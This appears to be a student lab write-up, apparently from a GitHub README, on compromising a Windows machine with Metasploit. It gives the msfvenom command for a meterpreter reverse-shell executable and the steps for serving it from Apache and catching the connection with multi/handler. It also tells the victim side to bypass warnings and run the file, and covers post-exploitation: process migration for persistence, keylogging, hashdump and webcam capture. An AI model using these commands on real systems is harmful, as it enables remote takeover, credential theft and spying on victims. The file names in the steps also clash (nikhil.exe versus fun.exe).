# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit


# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

<img width="732" height="498" alt="image" src="https://github.com/user-attachments/assets/f0b21e63-c196-4f8c-9cf4-c57bf565aa07" />


Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > nikhil.exe```

### Output:

<img width="917" height="244" alt="image" src="https://github.com/user-attachments/assets/e0c1c121-7bf8-4db7-9636-c464a5893f83" />



copy the nikhil.exe into the apache ```/var/www/html ```folder

<img width="409" height="122" alt="image" src="https://github.com/user-attachments/assets/bf91f50e-ed72-49ce-91b6-68b8f9751ae4" />
<img width="311" height="65" alt="image" src="https://github.com/user-attachments/assets/b72bc5ed-aefc-4229-be0e-8990f59cb038" />



Start apache server ```sudo systemctl apache2 start``` 
Check the status of apache2 ```sudo apache2 status```

<img width="809" height="385" alt="Screenshot 2025-09-29 083722" src="https://github.com/user-attachments/assets/b193bd17-d388-4ea2-885d-1338913f62b7" />



Invoke msfconsole:

<img width="642" height="648" alt="image" src="https://github.com/user-attachments/assets/24e92ff8-eda2-412d-a045-365ee9e44697" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="754" height="497" alt="image" src="https://github.com/user-attachments/assets/72c1356d-0d76-4d8d-9517-313e78b7f361" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="539" height="107" alt="image" src="https://github.com/user-attachments/assets/b4004be8-5d93-4140-b3d8-3d208811e2c5" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

